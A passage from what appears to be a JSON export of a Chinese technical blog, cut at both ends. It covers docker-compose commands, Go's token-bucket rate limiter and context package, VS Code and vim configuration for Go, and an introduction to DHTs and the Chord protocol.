设置环境变量值，可多次使用选项来设置多个环境变量。\n- -u, --user=\"\" 指定运行容器的用户名或者 uid。\n- --no-deps 不自动启动关联的服务容器。\n- --rm 运行命令后自动删除容器，d 模式下将忽略。\n- -p, --publish=[] 映射容器端口到本地主机。\n- --service-ports 配置服务端口并映射到本地主机。\n- -T 不分配伪 tty，意味着依赖 tty 的指令将无法运行。\n\n \n\n8.17 scale 设置指定服务运行的容器个数\n\n格式为 docker-compose scale [options] [SERVICE=NUM...]。\n\n通过 service=num 的参数来设置数量。例如：\n\n    $ docker-compose scale web=3 db=2\n\n将启动 3 个容器运行 web 服务，2 个容器运行 db 服务。\n\n一般的，当指定数目多于该服务当前实际运行容器，将新创建并启动容器；反之，将停止容器。\n\n选项：\n\n- -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.18 start 启动已经存在的服务容器\n\n格式为 docker-compose start [SERVICE...]。\n\n\n\n8.19 stop 停止已经处于运行状态的容器，但不删除它\n\n通过 docker-compose start 可以再次启动这些容器。\n\n格式为 docker-compose stop [options] [SERVICE...]。\n\n选项：\n\n- -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.20 top 查看各个服务容器内运行的进程\n\n \n\n8.21 unpause 恢复处于暂停状态中的服务\n\n格式为 docker-compose unpause [SERVICE...]。\n\n\n\n8.22 up 启动一个项目\n\n格式为 docker-compose up [options] [SERVICE...]。\n\n该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n\n链接的服务都将会被自动启动，除非已经处于运行状态。\n\n可以说，大部分时候都可以直接通过该命令来启动一个项目。\n\n\n\n默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n\n当通过 Ctrl-C 停止命令时，所有容器将会停止。\n\n如果使用 docker-compose up -d，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。\n\n默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容。如果用户不希望容器被停止并重新创建，可以使用 docker-compose up --no-recreate。这样将只会启动处于停止状态的容器，而忽略已经运行的服务。如果用户只想重新部署某个服务，可以使用 docker-compose up --no-deps -d <SERVICE_NAME> 来重新创建服务并后台停止旧服务，启动新服务，并不会影响到其所依赖的服务。\n\n选项：\n\n- -d 在后台运行服务容器。\n- --no-color 不使用颜色来区分不同的服务的控制台输出。\n- --no-deps 不启动服务所链接的容器。\n- --force-recreate 强制重新创建容器，不能与 --no-recreate 同时使用。\n- --no-recreate 如果容器已经存在了，则不重新创建，不能与 --force-recreate 同时使用。\n- --no-build 不自动构建缺失的服务镜像。\n- -t, --timeout TIMEOUT 停止容器时候的超时（默认为 10 秒）。\n\n\n\n8.23 version 打印版本信息\n\n格式为 docker-compose version。\n\n\n\n8.24 Compose 模板文件\n\n模板文件是使用 Compose 的核心，涉及到的指令关键字也比较多。大部分指令跟 docker run 相关参数的含义都是类似的。\n\n\n\n默认的模板文件名称为 docker-compose.yml，格式为 YAML 格式。\n\n    version: \"3\"\n    \n    services:\n      webapp:\n        image: examples/web\n        ports:\n          - \"80:80\"\n        volumes:\n          - \"/data\"\n\n\n\n注意每个服务都必须通过 image 指令指定镜像或 build 指令（需要 Dockerfile）等来自动构建生成镜像。\n\n如果使用 build 指令，在 Dockerfile 中设置的选项(例如：CMD, EXPOSE, VOLUME, ENV 等) 将会自动被获取，无需在 docker-compose.yml 中再次设置。","tags":["docker"],"categories":["docker"]},{"title":"令牌桶算法_golang_rate对速度进行限制","url":"%2Fp%2Fe25fe1fc.html","content":"\n### 限流算法\n\n限流算法，一般有漏桶算法和令牌桶算法两种限流算法。\n\n+ 漏桶算法\n\n漏桶算法(Leaky Bucket)是网络世界中流量整形（Traffic Shaping）或速率限制（Rate Limiting）时经常使用的一种算法，它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶算法提供了一种机制，通过它，突发流量可以被整形以便为网络提供一个稳定的流量。\n\n漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。\n\n如图所示，把请求比作是水，水来了都先放进桶里，并以限定的速度出水，当水来得过猛而出水不够快时就会导致水直接溢出，即拒绝服务。\n\n![1](令牌桶算法_golang_rate对速度进行限制/1.png)\n<!-- more -->\n+ 令牌桶算法\n\n令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。\n\n令牌桶算法的原理是系统会以一个恒定的速度往桶里放入令牌，而如果请求需要被处理，则需要先从桶里获取一个令牌，当桶里没有令牌可取时，则拒绝服务。从原理上看，令牌桶算法和漏桶算法是相反的，一个“进水”，一个是“漏水”。\n\n![2](令牌桶算法_golang_rate对速度进行限制/2.png)\n\n+ 漏桶算法和令牌桶算法的选择\n\n漏桶算法与令牌桶算法在表面看起来类似，很容易将两者混淆。但事实上，这两者具有截然不同的特性，且为不同的目的而使用。\n\n漏桶算法与令牌桶算法的区别在于，漏桶算法能够强行限制数据的传输速率，令牌桶算法能够在限制数据的平均传输速率的同时还允许某种程度的突发传输。\n\n需要注意的是，在某些情况下，漏桶算法不能够有效地使用网络资源，因为漏桶的漏出速率是固定的，所以即使网络中没有发生拥塞，漏桶算法也不能使某一个单独的数据流达到端口速率。因此，漏桶算法对于存在突发特性的流量来说缺乏效率。而令牌桶算法则能够满足这些具有突发特性的流量。通常，漏桶算法与令牌桶算法结合起来为网络流量提供更高效的控制。\n\n\n\n### golang rate.Limiter\n\n```\nfunc NewLimiter(r Limit, b int) *Limiter {\n\treturn &Limiter{\n\t\tlimit: r,\n\t\tburst: b,\n\t}\n}\n```\nLimter限制时间的发生频率，采用令牌池的算法实现。这个池子一开始容量为b，装满b个令牌，然后每秒往里面填充r个令牌。 \n\n由于令牌池中最多有b个令牌，所以一次最多只能允许b个事件发生，一个事件花费掉一个令牌。\n\n\n```\nl := rate.NewLimiter(1, 3) \n//第一个参数为每秒发生多少次事件，第二个参数是最大可运行多少个事件\n```\n\n\n### Allow/AllowN 当没有可用事件时，返回false\n\nAllowN标识在时间now的时候，n个事件是否可以同时发生(也意思就是now的时候是否可以从令牌池中取n个令牌)。如果你需要在事件超出频率的时候丢弃或跳过事件，就使用AllowN,否则使用Reserve或Wait.\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3) //刚开始有3个, 一秒填1个\n\n\tfor {\n\t\tif l.AllowN(time.Now(), 1) { //当前从令牌池取出 n 个令牌\n\t\t\tfmt.Println(time.Now().Format(\"04:05.000\")) //先把池子的3个消耗完毕, 以后1秒进入令牌池一个\n\t\t} else {\n\t\t\ttime.Sleep(1 * time.Second / 10)\n\t\t\tfmt.Println(time.Now().Format(\"Second 04:05.000\"))\n\t\t}\n\t}\n}\n\n\n\n43:32.534\n43:32.534\n43:32.534\nSecond 43:32.635\nSecond 43:32.737\nSecond 43:32.838\nSecond 43:32.938\nSecond 43:33.039\nSecond 43:33.144\nSecond 43:33.249\nSecond 43:33.350\nSecond 43:33.451\nSecond 43:33.552\n43:33.552\nSecond 43:33.653\nSecond 43:33.753\nSecond 43:33.854\nSecond 43:33.955\nSecond 43:34.055\n```\n\n\n\n### Wait/WaitN 当没有可用事件时，将阻塞等待\n\nWaitN 阻塞当前直到limit允许n个事件的发生。\n\n - 如果n超过了令牌池的容量大小则报错。\n\n - 如果Context被取消了则报错。\n\n - 如果limit的等待时间超过了Context的超时时间则报错。\n\n\n```\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tc, _ := context.WithCancel(context.TODO())\n\tfor {\n\t\tl.WaitN(c, 1)\n\t\tfmt.Println(time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n39:58.446\n39:58.446\n39:58.446\n39:59.451\n40:00.451\n40:01.450\n40:02.450\n```\n\n\n\n\n### Reserve/ReserveN\n\n当没有可用事件时返回对象Reservation ，标识调用者需要等多久才能等到n个事件发生(意思就是等多久令牌池中至少含有n个令牌)。\n\n如果ReserveN 传入的n大于令牌池的容量b，那么返回false.\n\n如果希望根据频率限制等待和降低事件发生的速度而不丢掉事件，就使用这个方法。\n\n我认为这里要表达的意思就是如果事件发生的频率是可以由调用者控制的话，可以用ReserveN 来控制事件发生的速度而不丢掉事件。如果要使用context的截止日期或cancel方法的话，使用WaitN。\n\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n\n\t\"golang.org/x/time/rate\"\n)\n\nfunc main() {\n\tl := rate.NewLimiter(1, 3)\n\n\tfor {\n\t\tr := l.ReserveN(time.Now(), 1)\n\t\ts := r.Delay()\n\t\ttime.Sleep(s)\n\t\tfmt.Println(s, time.Now().Format(\"04:05.000\"))\n\t}\n}\n\n\n\n0s 44:54.118\n0s 44:54.119\n0s 44:54.119\n999.857594ms 44:55.124\n994.670516ms 44:56.124\n994.778299ms 44:57.124\n994.763486ms 44:58.124\n```\n","tags":["golang"],"categories":["golang"]},{"title":"golang_context包的介绍和使用","url":"%2Fp%2F63c8f369.html","content":"\n\n\n\n### Context介绍\n一个网络请求Request，每个Request都需要开启一个goroutine做一些事情，这些goroutine又可能会开启其他的goroutine。所以我们需要一种可以跟踪goroutine的方案，才可以达到控制他们的目的，这就是Go语言为我们提供的Context，称之为上下文非常贴切，它就是goroutine的上下文。\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo func(ctx context.Context) {\n\t\tfor {\n\t\t\tselect {\n\t\t\tcase <-ctx.Done():\n\t\t\t\tfmt.Println(\"监控退出，停止了...\")\n\t\t\t\treturn\n\t\t\tdefault:\n\t\t\t\tfmt.Println(\"goroutine监控中...\")\n\t\t\t\ttime.Sleep(2 * time.Second)\n\t\t\t}\n\t\t}\n\t}(ctx)\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\n\n\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\ngoroutine监控中...\n可以了，通知监控停止\n监控退出，停止了...\n```\n\n\ncontext.Background() 返回一个空的Context，这个空的Context一般用于整个Context树的根节点。然后我们使用context.WithCancel(parent)函数，创建一个可取消的子Context，然后当作参数传给goroutine使用，这样就可以使用这个子Context跟踪这个goroutine。\n<!-- more -->\n\n\n\n### 控制多个gorotuine\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tgo watch(ctx, \"监控1\")\n\tgo watch(ctx, \"监控2\")\n\tgo watch(ctx, \"监控3\")\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\tcancel()\n\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context, name string) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(name, \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(name, \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控3 goroutine监控中...\n监控2 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n监控1 goroutine监控中...\n监控2 goroutine监控中...\n监控3 goroutine监控中...\n可以了，通知监控停止\n监控3 监控退出，停止了...\n监控1 监控退出，停止了...\n监控2 监控退出，停止了...\n\n```\n\n\n示例中启动了3个监控goroutine进行不断的监控，每一个都使用了Context进行跟踪，当我们使用cancel函数通知取消时，这3个goroutine都会被结束。这就是Context的控制能力，它就像一个控制器一样，按下开关后，所有基于这个Context或者衍生的子Context都会收到通知，这时就可以进行清理操作了，最终释放goroutine，这就优雅的解决了goroutine启动后不可控的问题。\n\n\n### Context 接口\n\n```\ntype Context interface {\n\tDeadline() (deadline time.Time, ok bool)\n\tDone() <-chan struct{}\n\tErr() error\n\tValue(key interface{}) interface{}\n}\n```\n\n\n* Deadline方法是获取设置的截止时间的意思，第一个返回式是截止时间，到了这个时间点，Context会自动发起取消请求；第二个返回值ok==false时表示没有设置截止时间，如果需要取消的话，需要调用取消函数进行取消。\n\n* Done方法返回一个只读的chan，类型为struct{}，我们在goroutine中，如果该方法返回的chan可以读取，则意味着parent context已经发起了取消请求，我们通过Done方法收到这个信号后，就应该做清理操作，然后退出goroutine，释放资源。\n\n* Err方法返回取消的错误原因，因为什么Context被取消。\n\n* Value方法获取该Context上绑定的值，是一个键值对，所以要通过一个Key才可以获取对应的值，这个值一般是线程安全的。\n\n\n\n### Context的继承衍生\n\n```\nfunc WithCancel(parent Context) (ctx Context, cancel CancelFunc)\nfunc WithDeadline(parent Context, deadline time.Time) (Context, CancelFunc)\nfunc WithTimeout(parent Context, timeout time.Duration) (Context, CancelFunc)\nfunc WithValue(parent Context, key, val interface{}) Context\n```\n\n\n+ value传递数据\n\n```\npackage main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"time\"\n)\n\nvar key string = \"name\"\n\nfunc main() {\n\tctx, cancel := context.WithCancel(context.Background())\n\tvalueCtx := context.WithValue(ctx, key, \"监控1\")\n\tgo watch(valueCtx)\n\n\ttime.Sleep(10 * time.Second)\n\tfmt.Println(\"可以了，通知监控停止\")\n\n\tcancel()\n\ttime.Sleep(5 * time.Second)\n}\nfunc watch(ctx context.Context) {\n\tfor {\n\t\tselect {\n\t\tcase <-ctx.Done():\n\t\t\tfmt.Println(ctx.Value(key), \"监控退出，停止了...\")\n\t\t\treturn\n\t\tdefault:\n\t\t\tfmt.Println(ctx.Value(key), \"goroutine监控中...\")\n\t\t\ttime.Sleep(2 * time.Second)\n\t\t}\n\t}\n}\n\n\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n监控1 goroutine监控中...\n可以了，通知监控停止\n监控1 监控退出，停止了...\n```\n\n\n### Context 使用原则\n\n* 不要把Context放在结构体中，要以参数的方式传递\n* 以Context作为参数的函数方法，应该把Context作为第一个参数，放在第一位。\n* 给一个函数方法传递Context的时候，不要传递nil，如果不知道传递什么，就使用context.TODO\n* Context的Value相关方法应该传递必须的数据，不要什么数据都使用这个传递\n* Context是线程安全的，可以放心的在多个goroutine中传递\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang_ide_vscode的使用调试和问题解决","url":"%2Fp%2F127812f2.html","content":"\n\n\n### 安装 vscode后的plugins:\n\n1. go\n2. vscode-icons\n3. code runner\n4. markdown preview github\n5. markdown auto-open\n6. vscode snippets 模板文件: [https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json](https://github.com/Microsoft/vscode-go/blob/master/snippets/go.json)\n7. theme molokai 自带\n   \n\n<!-- more -->\n### vscode增加golang debug调试:\n\n1. xcode-select --install\n\n2. 钥匙链创建证书 dlv-cert\n   \n3. 证书签名\n\n```    \ncd $GOPATH/src/github.com/derekparker\n    \ngit clone https://github.com/derekparker/delve.git  //调试 golang\n    \ncd delve\n    \nCERT=dlv-cert make install\n```\n\n\n\n\n\n### 我的vscode配置文件\n\n> setting.json\n\n```\n{\n    \"files.associations\": {\n        \"*.lua.txt\": \"lua\"\n    },\n    \"files.exclude\": {\n        \"**/.git\": true,\n        \"**/.svn\": true,\n        \"**/.hg\": true,\n        \"**/CVS\": true,\n        \"**/.DS_Store\": true,\n        \"**/*.meta\": true,\n    },\n    \"files.autoSave\": \"afterDelay\",\n    \"workbench.colorTheme\": \"Monokai\",\n    \"workbench.iconTheme\": \"vscode-icons\",\n    \"workbench.editor.enablePreview\": false,\n    \"editor.fontSize\": 14,\n    \"editor.minimap.enabled\": false,\n    \"editor.formatOnType\": true,\n    \"editor.formatOnSave\": true,\n    \"extensions.autoUpdate\": false,\n    \"extensions.ignoreRecommendations\": true,\n    \"window.zoomLevel\": 0,\n    \"luaide.scriptRoots\": [\n        \"/Users/liuwei/workspace/client3-5/Assets/Resources/Lua\"\n    ],\n    \"vim.disableAnnoyingNeovimMessage\": true,\n    \"go.useLanguageServer\": true,\n    \"go.docsTool\": \"gogetdoc\",\n    \"go.buildOnSave\": true,\n    \"go.lintOnSave\": true,\n    \"go.vetOnSave\": true,\n    \"go.buildFlags\": [],\n    \"go.lintFlags\": [],\n    \"go.vetFlags\": [],\n    \"go.coverOnSave\": false,\n    \"go.useCodeSnippetsOnFunctionSuggest\": false,\n    \"go.formatOnSave\": true,\n    \"go.formatTool\": \"goreturns\",\n    \"go.goroot\": \"/usr/local/Cellar/go/1.9.2/libexec\",\n    \"go.gopath\": \"/Users/liuwei/golang\",\n}\n\n```\n\n> launch.json\n\n```\n{\n    // 使用 IntelliSense 了解相关属性。 \n    // 悬停以查看现有属性的描述。\n    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387\n    \"version\": \"0.2.0\",\n    \"configurations\": [\n        {\n            \"name\": \"Launch\",\n            \"type\": \"go\",\n            \"request\": \"launch\",\n            \"mode\": \"debug\",\n            \"remotePath\": \"\",\n            \"port\": 2345,\n            \"host\": \"127.0.0.1\",\n            \"program\": \"${fileDirname}\",\n            \"env\": {},\n            \"args\": [],\n            \"showLog\": true\n        }\n    ]\n}\n```\n\n\n\n\n\n\n### vscode 遇到的问题\n\n+ flag provided but not defined: -goversion\n\n一个是版本原因, 一个是vscode也要修改配置gopath, 坑爹\n\n>Thank you, I was able to solve this by running brew uninstall --force go and then downloading the latest installer. Anyone who reads this and wants to use brew you could probably just do brew install go after the forced uninstall. I had to restart my terminal and Gogland after doing this.\n\n+ vscode not jump define\n\n```\n\"go.useLanguageServer\": true,\n\"go.docsTool\": \"gogetdoc\",\n```\n\n+ vscode could not launch process: exec: \"lldb-server\": executable file not found in $PATH\n\n```\nxcode-select --install\n```\n\n\n+ vscode jump slow\n\n安装https://github.com/sourcegraph/go-langserver 源码安装 需要 go install\n\n```\n\"go.useLanguageServer\": true,\n```\n\n\n+ vscode output window hide go\n\n~/.vscode/扩展包/package.json 找到显示的\n\n```\n\"showOutput\": \"never\"\n```\n\n","tags":["golang"],"categories":["golang"]},{"title":"vim插件管理_vimrc配置","url":"%2Fp%2F1b9bff9b.html","content":"\n# 1. vim-plug 安装\n\n```bash\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# 进入vim,  :PlugInstall 执行安装命令\n```\n\n<!-- more -->\n\n# 2. 我的.vimrc\n\n```bash\n\" Plugin \ncall plug#begin()\nPlug 'tomasr/molokai' \"主题\nPlug 'ctrlpvim/ctrlp.vim' \"快速查文件\nPlug 'Shougo/neocomplete.vim' \"代码实时提示\nPlug 'majutsushi/tagbar' \"tagbar\nPlug 'scrooloose/nerdtree' \"导航树\nPlug 'jistr/vim-nerdtree-tabs' \"导航树插件\nPlug 'vim-airline/vim-airline' \"状态栏\nPlug 'ervandew/supertab' \"supertab\nPlug 'SirVer/ultisnips' \"代码模板\nPlug 'Valloric/YouCompleteMe' \"table补全\nPlug 'easymotion/vim-easymotion' \"极速跳转\ncall plug#end()\n\n\n\" mapping\nlet mapleader=\",\"\nset mouse=a \"可以用鼠标拖动\nset clipboard=unnamed \"鼠标选中y复制\n\n\n\" easymotion\nlet g:EasyMotion_smartcase = 1\nlet g:EasyMotion_startofline = 0 \" keep cursor column when JK motion\nnmap s <Plug>(easymotion-overwin-f)\nnmap s <Plug>(easymotion-overwin-f2)\nmap  / <Plug>(easymotion-sn)\nomap / <Plug>(easymotion-tn)\nmap  n <Plug>(easymotion-next)\nmap  N <Plug>(easymotion-prev)\nmap <Leader>j <Plug>(easymotion-j)\nmap <Leader>k <Plug>(easymotion-k)\nmap <Leader>w <Plug>(easymotion-w)\nmap <Leader>b <Plug>(easymotion-b)\n\n\n\n\" Color \nsyntax enable\nset t_Co=256\nlet g:rehash256 = 1\nlet g:molokai_original = 1\ncolorscheme molokai\n\n\" Ycm\n\"let g:ycm_server_use_vim_stdout = 1\n\"let g:ycm_server_log_level = 'debug'\n\" make YCM compatible with UltiSnips (using supertab)\nlet g:ycm_key_list_select_completion = ['<C-n>', '<Down>']\nlet g:ycm_key_list_previous_completion = ['<C-p>', '<Up>']\nlet g:SuperTabDefaultCompletionType = '<C-n>'\nlet g:UltiSnipsExpandTrigger = \"<tab>\"\nlet g:UltiSnipsJumpForwardTrigger = \"<tab>\"\nlet g:UltiSnipsJumpBackwardTrigger = \"<s-tab>\"\n\n\n\" Nerdtree\n\"autocmd vimenter * NERDTree \"自动打开Tree\n\"autocmd vimenter * Tagbar \"自动打开TagBar\nnmap <F7> :NERDTreeToggle<CR>\nnmap <F8> :TagbarToggle<CR>\nlet NERDTreeWinSize=20 \"设置nerdtree宽度\nlet g:tagbar_width=20 \"设置宽度，默认为40\n\"let g:nerdtree_tabs_open_on_console_startup=1 \"启动打开nerdtree\nlet g:neocomplete#enable_at_startup = 1 \"代码实时提示\n\"let NERDTreeQuitOnOpen=1 \"打开文件后自动关闭窗口\n\n\" 打开NERDTree,定位到当前文件\nnoremap <silent> <Leader>f :NERDTreeFind<cr> \n\"打开tagbar窗口,跳转后自动关闭,q不跳转直接关闭\nnoremap <silent> <Leader>g :TagbarOpen fjc<cr> \n\" NERDTree tab switch\nmap  <C-l> :tabn<CR>\nmap  <C-h> :tabp<CR>\nmap  <C-o> :tabnew<CR>\n\n\n\" config\nset tabstop=4                   \" 设定tab长度为4\nset shiftwidth=4                \" 缩进的空格数为4\n\nfiletype off                    \" Reset filetype detection first ...\nfiletype plugin indent on       \" ... and enable filetype detection\nset nocompatible                \" Enables us Vim specific features\nset ttyfast                     \" Indicate fast terminal conn for faster \nset ttymouse=xterm2             \" Indicate terminal type for mouse codes\nset ttyscroll=3                 \" Speedup scrolling\nset laststatus=2                \" Show status line always\nset encoding=utf-8              \" Set default encoding to UTF-8\nset autoread                    \" Automatically read changed files\nset autoindent                  \" Enabile Autoindent\nset backspace=indent,eol,start  \" Makes backspace key more powerful.\nset incsearch                   \" Shows the match while typing\nset hlsearch                    \" Highlight found searches\nset noerrorbells                \" No beeps\nset number                      \" Show line numbers\nset showcmd                     \" Show me what I'm typing\nset noswapfile                  \" Don't use swapfile\nset nobackup                    \" Don't create annoying backup files\nset splitright                  \" Vertical windows should be split to right\nset splitbelow                  \" Horizontal windows should split to bottom\nset autowrite                   \" Automatically save before :next, :make etc.\nset hidden                      \" Buffer still exist if window is closed\nset fileformats=unix,dos,mac    \" Prefer Unix over Windows over OS 9 formats\nset noshowmatch                 \" Do not show matching brackets by flickering\nset noshowmode                  \" We show the mode with airline or lightline\nset ignorecase                  \" Search case insensitive...\nset smartcase                   \" but not it begins with upper case\nset completeopt=menu,menuone    \" Show popup menu, even if there is one entry\nset pumheight=10                \" Completion window max size\nset nocursorcolumn              \" Dont highlight column\nset nocursorline                \" Dont highlight cursor\nset lazyredraw                  \" Wait to redraw\nset cursorcolumn\n```\n\n\n\n# 3. vim配置\n\n### 3.1 vim 拷贝到系统剪贴板\n\n1. which vim可以看到当前使用的vim是哪个，vim --version可以看到当前使用的vim支持哪些feature，'+'前缀表示拥有的feature，'-'前缀表示未拥有；\n\n2. '+clipboard'是支持使用系统剪切板的feature；如果你当前使用的vim不支持clipboard，那需要brew upgrade vim装一个新的；\n\n3. 安装新的以后，要把这个新的vim设置为默认vim，通常使用alias设置一下别名，或者通过环境变量设置，或者删掉旧的，做个软连接；\n\n4. 确认+clipboard以后，在.vimrc文件中加入set clipboard=unamed，就可以在vim中使用系统剪切板了\n\n\n","tags":["linux"],"categories":["vim"]},{"title":"dht分布式散列表和kad介绍","url":"%2Fp%2F2c46e603.html","content":"\n\n### 1. 如何实现散列表\n\n+ 在散列表这种数据结构中，会包含 N 个 bucket（桶）。对于某个具体的散列表，N（桶的数量）通常是【固定不变】的。于是可以对每个桶进行编号，从 0 到 N-1。\n\n+ “桶”是用来存储“键值对”的，你可以把它通俗理解成一个动态数组，里面可以存放【多个】“键值对”。\n\n+ 当使用某个 key 进行查找，会先用某个散列函数计算这个 key 的散列值。得到散列值通常是一个整数，然后用散列值对 N（桶数）进行“取模”运算（除法求余数），就可以算出对应的桶编号。（注：取模运算是最常用的做法，但不是唯一的做法）\n\n<!-- more -->\n\n### 2. 分布式散列表 DHT\n\n##### 2.1 P2P 技术路线\n\n- 中央服务器  Napster  ->单点故障\n- 广播   Gnutella 早期版本 ->广播风暴\n- DHT\n\n##### 2.2 DHT 难点\n\n- 无中心 \n\t\n\t需要提供一系列机制来实现节点之间的通讯。\n- 海量数据 \n\t\n\t每个节点只能存储（整个系统的）一小部分数据。需要把数据【均匀分摊】到每个节点。\n- 节点动态变化  \n\n\t统散列表所含的【桶数】是固定不变滴。为啥捏？因为传统散列表在针对 key 计算出散列值之后，需要用“散列值”和“桶数”进行某种运算（比如：取模运算），从而得到桶的编号。如果桶的数量出现变化，就会影响到上述“取模运算”的结果，然后导致数据错乱。\n\n- 高效查询\n\n##### 2.3 DHT 难点解决\n\n- 散列算法的选择\n\n\tDHT业务数据的散列值作为Key,业务数据为Value, 所以要避免碰撞\n\n- 同构的 nodeID 和 data key\n\n\tDHT 属于分布式系统的一种。既然是分布式系统，意味着存在【多个】节点\n\t\n\t很多 DHT 的设计会让“node ID”采用跟“data key”【同构】的散列值。这么搞的好处是\n\t1、当散列值空间足够大的时候，随机碰撞忽略不计，因此也就确保了 node ID 的唯一性 2、可以简化系统设计——比如简化路由算法\n\t\n- “拓扑结构”的设计\n\n\t作为分布式系统，DHT 必然要定义某种拓扑结构；有了拓扑结构，自然就要设计某种“路由算法”。如果某个 DHT 采用前面所说的——“node ID”与“data key”【同构】——那么很自然的就会引入“Key-based routing”。\n\t\n\t请注意，这【不是】某个具体的路由算法，而只是某种【风格】。采用这种风格来设计路由机制，好处是：key 本身已经提供了足够多的路由信息。\n\n- “路由算法”的权衡\n\n  由于 DHT 中的节点数可能非常多（比如：几十万、几百万），而且这些节点是动态变化的。因此就【不可能】让每一个节点都记录所有其它节点的信息。实际情况是：每个节点通常只知道少数一些节点的信息。\n\n  在确定了路由算法之后，还需要做一个两难的权衡——“路由表的大小”。\n  路由表越大，可以实现越短（跳数越少）的路由；缺点是：（由于节点动态变化）路由表的维护成本也就越高。\n  路由表数越小，其维护成本越小；缺点是：路由就会变长（跳数变多）。\n\n- 距离算法\n\n   某些 DHT 系统还会定义一种“距离算法”，用来计算：“节点之间的距离”、“数据之间的距离”、“节点与数据的距离”。\n\n   写到这里，某些聪明的读者就会明白：为啥前面要强调——“node ID”与“data key”【同构】。当这两者【同构】，就可以使用【同一种“距离算法”】；反之，如果这两者不同构，多半要引入几种不同的“距离算法”。\n\n- 数据定位\n\n\t+ 保存数据\n\t\t\n\t\t当某个节点得到了新加入的数据（K/V），它会先计算自己与新数据的 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\t\n\t\t如果计算下来，自己与 key 的距离最小，那么这个数据就保持在自己这里。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n\t+ 获取数据\n\n\t   当某个节点接收到查询数据的请求（key），它会先计算自己与 key 之间的“距离”；然后再计算它所知道的其它节点与这个 key 的距离。\n\t\n\t  如果计算下来，自己与 key 的距离最小，那么就在自己这里找有没有 key 对应的 value。有的话就返回 value，没有的话就报错。否则的话，把这个数据转发给距离最小的节点。收到数据的另一个节点，也采用上述过程进行处理（递归处理）。\n\n### 3. Chord 协议\n\n+ 概述\n\nChord 诞生于2001年。第一批 DHT 协议都是在那年涌现的，另外几个是：CAN、Tapestry、Pastry。\n\n\n+ 拓扑结构——环形\n\t\n\t当初设计“一致散列”主要是为了解决“节点动态变化”这个难点（前面有提及）。为了解决这个难点，“一致散列”把散列值空间（keyspace）构成一个【环】。对于 m 比特的散列值，其范围是 [0, 2m-1]。你把这个区间头尾相接就变成一个环，其周长是 2m。然后对这个环规定了一个移动方向（比如顺时针）。\n\t\n\t\n\t假设有某个节点A，距离它最近的是节点B（以顺时针方向衡量距离）。那么称 B 是 A 的【继任】（successor），A 是 B 的【前任】（predecessor）。\n\n\t```\n\t数据隶属于【距离最小】的节点。以 m=6 的环形空间为例：\n\t数据区间 [5,8] 隶属于节点8\n\t数据区间 [9,15] 隶属于节点15\n\t......\n\t数据区间 [59,4] 隶属于节点4（注：“6比特”的环形空间，63之后是0）\n\t```\n\n\n+ 路由机制\n\n\t- 基本路由（简单遍历）\n\n\t\t当收到请求（key），先看 key 是否在自己这里。如果在自己这里，就直接返回信息；否则就把 key 转发给自己的继任者。以此类推。\n\t　　这种玩法的时间复杂度是 O(N)。对于一个节点数很多的 DHT 网络，这种做法显然非常低效。\n\t\n\t- 高级路由（Finger Table）\n\n\t\t“Finger Table”是一个列表，最多包含 m 项（m 就是散列值的比特数），每一项都是节点 ID。 